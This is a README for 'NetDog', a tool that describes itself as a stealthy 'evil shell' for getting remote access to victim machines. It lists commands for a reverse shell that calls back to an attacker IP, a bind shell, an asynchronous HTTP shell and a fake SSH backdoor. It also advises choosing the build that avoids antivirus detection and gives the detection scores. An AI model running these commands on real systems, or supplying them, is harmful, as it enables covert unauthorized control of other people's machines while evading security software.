# NetDog
Mini Stealthy Evil Shell

## Roadmap
- Reverse Shell
    - [x] TCP
        - [ ] TLS
    - [x] UDP
        - [ ] DTLS
- Bind Shell
    - [x] TCP (use SSH backdoor if encrypted communication is needed)
    - [x] UDP
        - [ ] DTLS
- HTTP shell
    - Web Shell (will be available at [gohfs](https://github.com/finzzz/gohfs))
    - [x] Asynchronous
        - [ ] TLS
- Others
    - [x] Auto reconnect
    - [x] Fake SSH
        - [ ] Multiple connection
        - [ ] Interactive shell
    - [ ] Pack rustscan to the binary

## Choosing binary
- There are only 2 types: `nd` (linux/amd64) `nd.exe` (windows/amd64)  
- For windows, choose the one without upx to avoid being detected as virus.  

## Reverse shell
```bash
# attacker
nc -lvnp 1234

# victim
./nd $ATTACKER_IP 1234 -recon 5s # reconnect every 5 seconds
```

## Bind shell
```bash
# victim
./nd -m listen

# attacker
nc $VICTIM_IP $VICTIM_PORT
```

## Asynchronous HTTP shell
```
+-------------------------+                 +------------------------+
|victim                   |                 |attacker                |
|http client              |                 |http server             |
|                         |                 |                        |
|                         |   find command  |                        |
|                         +----------------->                        |
|            execute <----+                 |                        |
|                         +----------------->                        |
|                         |    response     |                        |
|                         |                 |                        |
|                         |                 |                        |
+-------------------------+                 +------------------------+
```
```bash
./nd -m http -server # server
./nd -m http -host $ATTACKER_IP -port $ATTACKER_PORT # client
```

## Fake SSH
```bash
# on victim machine
echo -n "netdog" | sha256sum # generate password hash
./nd -m ssh -hash d7b8c7f4fe8b3a9c2ed92189aed08530c5cb02c6e330a1fb3005cb4c0ca04151 # start the server

# on attacker machine
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no whatever@$VICTIM_IP -p $VICTIM_PORT
```

## AV status
2021-05-23 03:13:04 UTC

| type | size | score | windows defender |
| - | - | -| - |
|without upx | 2.2 MB|[4/69](https://www.virustotal.com/gui/file/b042c2498ab6ee36ce998842d4ed4592d46f55026677f1f6e750edf7b6a2411d/detection)| pass|
|with upx | 663 KB|[6/69](https://www.virustotal.com/gui/file/b6f9b09b20cda55d3e87d4f3c74971bffa65781c297ea4742c5987cc69b9b391/detection)| not pass|